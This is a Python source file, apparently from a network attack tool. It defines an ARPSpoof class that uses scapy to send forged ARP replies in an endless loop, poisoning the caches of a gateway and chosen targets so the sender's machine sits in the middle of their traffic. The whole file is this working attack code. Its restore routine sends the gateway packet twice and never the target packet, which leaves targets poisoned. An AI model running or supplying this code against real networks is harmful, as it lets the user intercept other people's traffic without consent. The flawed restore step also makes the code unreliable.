import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # scapy, don't be noisy
from scapy.all import *
from time import sleep

conf.verb = 0 # please, scapy! :(

GREEN = "\033[1;32m"
YELLOW = "\033[1;93m"
NORMAL = "\033[0;0m"

class ARPSpoof(object):
    def __init__(self, targets, gateway_ip, gateway_mac, interface):
        self.targets = targets
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.interface = interface
        self.BROADCAST = "ff:ff:ff:ff:ff:ff"
        
    def arp_spoof(self):
        while True:
            for target_mac in self.targets:
                target_ip = self.targets[target_mac]
                gateway_pkt = Ether() / ARP(op=2, pdst=self.gateway_ip, psrc=target_ip, hwdst=self.gateway_mac)
                target_pkt = Ether() / ARP(op=2, pdst=target_ip, psrc=self.gateway_ip, hwdst=target_mac)
                sendp(gateway_pkt)
                sendp(target_pkt)
            sleep(2)

    def restore_arp(self):
        for target_mac in self.targets:
            try:
                target_ip = self.targets[target_mac]
                gateway_pkt = Ether() / ARP(op=2, pdst=self.gateway_ip, psrc=target_ip, hwdst=self.BROADCAST, hwsrc=target_mac)
                target_pkt = Ether() / ARP(op=2, pdst=target_ip, psrc=self.gateway_ip, hwdst=self.BROADCAST, hwsrc=self.gateway_mac)
                sendp(gateway_pkt, count=3, inter=0.2)
                sendp(gateway_pkt, count=3, inter=0.2)
            except KeyboardInterrupt:
                continue
